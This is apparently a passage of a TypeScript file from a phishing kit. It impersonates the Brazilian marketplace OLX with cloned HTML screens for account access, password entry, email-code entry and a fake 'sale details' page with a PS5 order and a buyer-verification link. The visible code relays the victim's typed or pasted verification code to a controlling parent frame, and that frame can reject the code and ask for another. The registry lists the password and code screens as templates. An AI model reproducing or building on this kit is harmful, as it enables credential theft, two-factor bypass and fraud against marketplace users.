          setLoading(true);
          window.parent.postMessage({
            type: 'iframe-help-action',
            action: 'email-code-submit',
            code: code
          }, '*');
        }
      }

      // Permite que o pai resete a tela em caso de rejeição
      window.addEventListener('message', function(e){
        var d = e.data;
        if(!d || typeof d !== 'object') return;
        if(d.type === 'iframe-code-error'){
          showError(d.message);
        }
      });

      inputs.forEach(function(inp, idx){
        inp.addEventListener('input', function(){
          inp.value = (inp.value || '').replace(/\\D/g, '').slice(0, 1);
          inp.removeAttribute('aria-invalid');
          clearError();
          if(inp.value && idx < inputs.length - 1){
            inputs[idx + 1].focus();
          }
          emitIfFull();
        });
        inp.addEventListener('keydown', function(e){
          if(e.key === 'Backspace' && !inp.value && idx > 0){
            inputs[idx - 1].focus();
          }
        });
        inp.addEventListener('paste', function(e){
          var txt = (e.clipboardData || window.clipboardData).getData('text') || '';
          var digits = txt.replace(/\\D/g, '').slice(0, inputs.length);
          if(!digits) return;
          e.preventDefault();
          for(var i = 0; i < inputs.length; i++){
            inputs[i].value = digits[i] || '';
          }
          var last = Math.min(digits.length, inputs.length) - 1;
          if(last >= 0) inputs[last].focus();
          emitIfFull();
        });
      });

      var resendBtn = document.getElementById('resend-btn');
      if(resendBtn){
        resendBtn.addEventListener('click', function(){
          window.parent.postMessage({ type: 'iframe-help-action', action: 'email-code-resend' }, '*');
        });
      }

      var backBtn = document.querySelector('[data-action="back"]');
      if(backBtn){
        backBtn.addEventListener('click', function(){
          window.parent.postMessage({ type: 'iframe-link-click', url: 'back' }, '*');
        });
      }
    })();
  </script>
</body>
</html>`;

const VERIFICATION_SUCCESS_HTML = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Detalhes da venda - OLX</title>
<style>
  *,*::before,*::after{box-sizing:border-box}
  html,body{margin:0;padding:0;background:#fff;color:#1a1a1a;font-family:-apple-system,BlinkMacSystemFont,'Open Sans','Segoe UI',Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;min-height:100%}
  .wrap{max-width:480px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column}
  header.topbar{position:sticky;top:0;z-index:20;background:#fff;border-bottom:1px solid #ececec;display:flex;align-items:center;gap:16px;padding:16px}
  header.topbar .back{display:inline-flex;padding:4px;background:none;border:0;cursor:pointer;color:#1a1a1a}
  header.topbar h2{margin:0;font-size:18px;font-weight:600;color:#1a1a1a}
  main{flex:1;padding:20px 20px 40px}
  h1.page-title{font-size:24px;font-weight:700;margin:0;color:#1a1a1a}
  .pedido-row{display:flex;align-items:center;gap:8px;margin-top:12px;font-size:14px;color:#1a1a1a}
  .copy-btn{background:none;border:0;padding:2px;cursor:pointer;color:#6E0AD6;display:inline-flex}
  .pedido-date{font-size:14px;color:#1a1a1a;margin:4px 0 0}
  .divider{border-top:1px solid #ececec;margin:20px 0 0}
  .product{display:flex;align-items:center;gap:16px;width:100%;padding:20px 0;background:none;border:0;text-align:left;cursor:pointer;color:inherit;font:inherit}
  .product img,.product .placeholder{height:64px;width:80px;flex-shrink:0;border-radius:6px;object-fit:cover;background:linear-gradient(135deg,#1a1a2e,#0e4ea8);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:16px}
  .product .title{flex:1;font-size:16px;font-weight:500;color:#1a1a1a}
  .product .arrow{color:#6E0AD6}
  .section{padding-top:24px}
  .section h2{font-size:20px;font-weight:700;color:#1a1a1a;margin:0}
  .info-row{display:flex;align-items:center;gap:12px;margin-top:16px;font-size:14px;color:#1a1a1a}
  .pill-blue{display:inline-flex;align-items:center;gap:6px;background:#e0f1fb;padding:6px 10px;border-radius:6px;font-size:14px;color:#1a1a1a}
  .alert{display:flex;gap:12px;background:#fff8e6;border:1px solid rgba(217,160,40,.4);border-radius:8px;padding:12px;margin-top:12px}
  .alert .alert-icon{flex-shrink:0;color:#b76e00;margin-top:2px}
  .alert p{margin:0 0 12px;font-size:14px;line-height:1.5;color:#1a1a1a}
  .alert p:last-child{margin:0}
  .link-box{display:flex;align-items:center;gap:8px;background:#fff;border:1px solid rgba(217,160,40,.4);border-radius:6px;padding:8px;margin-top:12px}
  .link-box .link-icon{color:#b76e00;flex-shrink:0}
  .link-box .link-text{flex:1;font-size:12px;font-weight:500;color:#1a1a1a;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
  .link-box button{background:#6E0AD6;color:#fff;border:0;border-radius:9999px;padding:6px 14px;font-size:12px;font-weight:600;cursor:pointer}
  .tip-link{display:inline-block;margin-top:14px;font-size:14px;font-weight:600;color:#6E0AD6;text-decoration:none}
  .btn-primary{display:block;width:100%;margin-top:20px;padding:14px;background:#f48120;color:#fff;border:0;border-radius:9999px;font-size:16px;font-weight:600;cursor:pointer;box-shadow:0 1px 2px rgba(0,0,0,.05)}
  .timeline{display:grid;grid-template-columns:36px 1fr;gap:16px;margin-top:24px}
  .tl-col{display:flex;flex-direction:column;align-items:center}
  .tl-icon{width:36px;height:36px;border-radius:50%;background:#f48120;color:#fff;display:flex;align-items:center;justify-content:center}
  .tl-line{width:2px;flex:1;background:#f48120;min-height:24px}
  .tl-dot{width:12px;height:12px;border-radius:50%;background:#f48120}
  .tl-spacer{height:24px}
  .tl-text{display:flex;flex-direction:column}
  .tl-text .top{font-size:16px;font-weight:700;color:#1a1a1a;margin:0}
  .tl-text .top-sub{font-size:14px;color:#6b6b6b;margin:2px 0 0}
  .tl-text .bottom{margin-top:auto;padding-top:24px}
  .tl-text .bottom p{margin:0;font-size:16px;color:#1a1a1a}
  .tl-text .bottom .sub{font-size:14px;color:#6b6b6b;margin-top:2px}
  .pay-list{margin-top:16px;display:flex;flex-direction:column;gap:12px;font-size:16px}
  .pay-row{display:flex;justify-content:space-between;align-items:center;color:#1a1a1a}
  .pay-row.total{font-weight:700}
  .buyer{display:flex;align-items:center;justify-content:space-between;margin-top:16px;padding:8px 0}
  .buyer-left{display:flex;align-items:center;gap:12px}
  .buyer-avatar{width:44px;height:44px;border-radius:50%;background:#d4d8e0;color:#56627a;font-size:16px;font-weight:600;display:flex;align-items:center;justify-content:center}
  .buyer-name{margin:0;font-size:16px;font-weight:600;color:#1a1a1a}
  .buyer-link{margin:2px 0 0;font-size:14px;font-weight:500;color:#6E0AD6}
  .buyer-msg{padding:4px;color:#6E0AD6;background:none;border:0;cursor:pointer;display:inline-flex}
  .help-nav{margin-top:40px;display:flex;flex-direction:column;align-items:center;gap:20px}
  .help-nav a{font-size:16px;color:#1a1a1a;text-decoration:none}
  .legal-nav{margin-top:24px;display:flex;flex-direction:column;align-items:center;gap:16px}
  .legal-nav a{font-size:14px;color:#1a1a1a;text-decoration:none}
  .copyright{margin-top:32px;font-size:12px;font-style:italic;color:#6b6b6b;text-align:center;line-height:1.45}
  .social{margin-top:32px;display:flex;align-items:center;justify-content:center;gap:28px;color:#1a1a1a}
  .social a{color:inherit}
  .toast{position:fixed;left:50%;bottom:24px;transform:translateX(-50%);background:#1a1a1a;color:#fff;padding:10px 16px;border-radius:9999px;font-size:13px;opacity:0;pointer-events:none;transition:opacity .2s;z-index:50}
  .toast.show{opacity:1}
</style>
</head>
<body>
  <div class="wrap">
    <header class="topbar">
      <button type="button" class="back" aria-label="Voltar">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
      </button>
      <h2>Meus Pedidos</h2>
    </header>

    <main>
      <h1 class="page-title">Detalhes da venda</h1>
      <div class="pedido-row">
        <span>Pedido <span id="order-number">6985866921454226215</span></span>
        <button type="button" class="copy-btn" id="copy-order" aria-label="Copiar número do pedido">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
        </button>
      </div>
      <p class="pedido-date" id="order-date">16/11/2025 20h32</p>

      <div class="divider"></div>

      <button type="button" class="product">
        <div class="placeholder" aria-hidden="true">PS5</div>
        <span class="title">Ps5 slim</span>
        <span class="arrow"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg></span>
      </button>

      <div class="divider" style="margin-top:0"></div>

      <section class="section">
        <h2>Informações de envio</h2>
        <div class="info-row">
          <span>Entrega:</span>
          <span class="pill-blue">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
            Em mãos
          </span>
        </div>
      </section>

      <div class="divider"></div>

      <section class="section">
        <h2>Entrega pendente</h2>
        <div class="alert">
          <svg class="alert-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3 1.8 20.5h20.4L12 3z"/><line x1="12" y1="10" x2="12" y2="14.5"/><line x1="12" y1="17.3" x2="12" y2="17.4"/></svg>
          <div style="flex:1;min-width:0">
            <p>Compartilhe o link abaixo com o comprador para que ele faça a verificação e a transação possa continuar com segurança:</p>
            <div class="link-box">
              <svg class="link-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 17H7A5 5 0 0 1 7 7h2"/><path d="M15 7h2a5 5 0 1 1 0 10h-2"/><line x1="8" y1="12" x2="16" y2="12"/></svg>
              <span class="link-text" id="verif-link">https://olx.com.br/verificar/6985866921454226215</span>
              <button type="button" id="copy-link">Copiar</button>
            </div>
          </div>
        </div>

        <a href="#" class="tip-link">Dicas de segurança</a>

        <button type="button" class="btn-primary">Entreguei o produto</button>

        <div class="timeline">
          <div class="tl-col">
            <div class="tl-icon">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16.5 9.4 7.55 4.24"/><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></svg>
            </div>
            <div class="tl-line"></div>
            <div class="tl-dot"></div>
            <div class="tl-spacer"></div>
          </div>
          <div class="tl-text">
            <div>
              <p class="top">Entrega pendente</p>
              <p class="top-sub" id="pending-date">16/11 20h33</p>
            </div>
            <div class="bottom">
              <p>Venda realizada</p>
              <p class="sub" id="sale-date">16/11 20h33</p>
            </div>
          </div>
        </div>
      </section>

      <div class="divider"></div>

      <section class="section">
        <h2>Pagamento</h2>
        <div class="pay-list">
          <div class="pay-row"><span>Valor do Produto</span><span>R$ <span id="prod-value">2350,00</span></span></div>
          <div class="pay-row"><span>Tarifa de serviço</span><span>- R$ 0,00</span></div>
          <div class="pay-row total"><span>Valor a receber</span><span>R$ <span id="receive-value">2350,00</span></span></div>
        </div>
      </section>

      <div class="divider"></div>

      <section class="section">
        <h2>Contato com o comprador</h2>
        <div class="buyer">
          <div class="buyer-left">
            <div class="buyer-avatar" id="buyer-initial">T</div>
            <div>
              <p class="buyer-name" id="buyer-name">Thierry</p>
              <p class="buyer-link">Ver perfil</p>
            </div>
          </div>
          <button type="button" class="buyer-msg" aria-label="Conversar com comprador">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg>
          </button>
        </div>
      </section>

      <nav class="help-nav">
        <a href="#">Ajuda</a>
        <a href="#">Dicas de segurança</a>
        <a href="#">Sobre a OLX</a>
        <a href="#">Vender na OLX</a>
        <a href="#">Plano profissional</a>
      </nav>

      <div class="divider" style="margin-top:32px"></div>

      <nav class="legal-nav">
        <a href="#">Termos de uso</a>
        <a href="#">Política de privacidade</a>
        <a href="#">Propriedade intelectual</a>
        <a href="#">Mapa do site</a>
        <a href="#">Trabalhe conosco</a>
        <a href="#">Grupo OLX</a>
        <a href="#">ZAP imóveis</a>
        <a href="#">Viva Real</a>
      </nav>

      <p class="copyright">© Bom Negócio Atividades de Internet Ltda. - Rua do Catete, 359, Flamengo - 22220-001 - Rio de Janeiro, RJ</p>

      <div class="social">
        <a href="#" aria-label="Facebook"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"/></svg></a>
        <a href="#" aria-label="YouTube"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22.54 6.42a2.78 2.78 0 0 0-1.94-2C18.88 4 12 4 12 4s-6.88 0-8.6.46a2.78 2.78 0 0 0-1.94 2A29 29 0 0 0 1 11.75a29 29 0 0 0 .46 5.33A2.78 2.78 0 0 0 3.4 19c1.72.46 8.6.46 8.6.46s6.88 0 8.6-.46a2.78 2.78 0 0 0 1.94-2 29 29 0 0 0 .46-5.25 29 29 0 0 0-.46-5.33z"/><polygon points="9.75 15.02 15.5 11.75 9.75 8.48 9.75 15.02"/></svg></a>
        <a href="#" aria-label="TikTok"><svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5.8 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1.84-.1z"/></svg></a>
        <a href="#" aria-label="Instagram"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"/><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"/></svg></a>
        <a href="#" aria-label="X"><svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2H21.5l-7.5 8.59L23 22h-6.81l-5.34-6.99L4.78 22H1.5l8.04-9.2L1 2h6.95l4.83 6.4L18.244 2zm-2.39 18h1.88L7.23 4H5.22l10.634 16z"/></svg></a>
        <a href="#" aria-label="LinkedIn"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-4 0v7h-4v-7a6 6 0 0 1 6-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a>
      </div>
    </main>
  </div>

  <div class="toast" id="toast"></div>

  <script>
    (function(){
      function showToast(msg){
        var t = document.getElementById('toast');
        if(!t) return;
        t.textContent = msg;
        t.classList.add('show');
        setTimeout(function(){ t.classList.remove('show'); }, 1800);
      }
      var copyOrder = document.getElementById('copy-order');
      if(copyOrder){
        copyOrder.addEventListener('click', function(){
          var n = document.getElementById('order-number').textContent || '';
          if(navigator.clipboard){ navigator.clipboard.writeText(n).then(function(){ showToast('Pedido copiado!'); }, function(){ showToast('Não foi possível copiar'); }); }
          else { showToast('Pedido copiado!'); }
        });
      }
      var copyLink = document.getElementById('copy-link');
      if(copyLink){
        copyLink.addEventListener('click', function(){
          var l = document.getElementById('verif-link').textContent || '';
          var orig = copyLink.textContent;
          if(navigator.clipboard){ navigator.clipboard.writeText(l).catch(function(){}); }
          copyLink.textContent = 'Copiado!';
          setTimeout(function(){ copyLink.textContent = orig; }, 2000);
        });
      }
    })();
  </script>
</body>
</html>`;

export const MANUAL_SCREEN_TEMPLATES: Record<string, { title: string; html: string }> = {
  "access-account": {
    title: "Acesse sua conta",
    html: ACCESS_ACCOUNT_HTML,
  },
  "password": {
    title: "Tela de senha",
    html: PASSWORD_SCREEN_HTML,
  },
  "email-code": {
    title: "Tela de e-mail (código)",
    html: EMAIL_CODE_SCREEN_HTML,
  },
  "verification-success": {
    title: "Verificação aprovada",
    html: VERIFICATION_SUCCESS_HTML,
  },
};
